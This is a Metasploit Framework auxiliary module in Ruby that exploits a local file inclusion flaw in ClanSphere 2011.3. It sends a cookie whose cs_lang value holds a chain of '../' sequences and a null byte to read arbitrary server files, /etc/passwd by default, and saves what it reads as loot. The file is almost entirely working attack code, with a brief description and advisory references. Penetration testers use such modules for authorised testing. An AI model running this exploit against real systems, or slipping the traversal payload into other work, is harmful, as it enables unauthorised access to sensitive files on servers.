##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ClanSphere 2011.3 Local File Inclusion Vulnerability',
			'Description'    => %q{
				This module exploits a directory traversal flaw found in Clansphere 2011.3.
				The application fails to handle the cs_lang parameter properly, which can be
				used to read any file outside the virtual directory.
			},
			'References'     =>
				[
					['OSVDB', '86720'],
					['EDB', '22181']
				],
			'Author'         =>
				[
					'blkhtc0rp',  #Original
					'sinn3r'
				],
			'License'        => MSF_LICENSE,
			'DisclosureDate' => "Oct 23 2012"
		))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The URI path to the web application', '/clansphere_2011.3/']),
				OptString.new('FILE',      [true, 'The file to obtain', '/etc/passwd']),
				OptInt.new('DEPTH',        [true, 'The max traversal depth to root directory', 10])
			], self.class)
	end


	def run_host(ip)
		base = normalize_uri(target_uri.path)

		peer = "#{ip}:#{rport}"

		print_status("#{peer} - Reading '#{datastore['FILE']}'")

		traverse = "../" * datastore['DEPTH']
		f = datastore['FILE']
		f = f[1, f.length] if f =~ /^\//

		res = send_request_cgi({
			'method' => 'GET',
			'uri'    => normalize_uri(base, "index.php"),
			'cookie' => "blah=blah; cs_lang=#{traverse}#{f}%00.png"
		})

		if res and res.body =~ /^Fatal error\:/
			print_error("#{peer} - Unable to read '#{datastore['FILE']}', possibily because:")
			print_error("\t1. File does not exist.")
			print_error("\t2. No permission.")
			print_error("\t3. #{ip} isn't vulnerable to null byte poisoning.")

		elsif res and res.code == 200
			pattern_end = "     UTC +1 - Load:"
			data = res.body.scan(/\<div id\=\"bottom\"\>\n(.+)\n\x20{5}UTC.+/m).flatten[0].lstrip
			fname = datastore['FILE']
			p = store_loot(
				'clansphere.cms',
				'application/octet-stream',
				ip,
				data,
				fname
			)

			vprint_line(data)
			print_good("#{peer} - #{fname} stored as '#{p}'")

		else
			print_error("#{peer} - Fail to obtain file for some unknown reason")
		end
	end

end
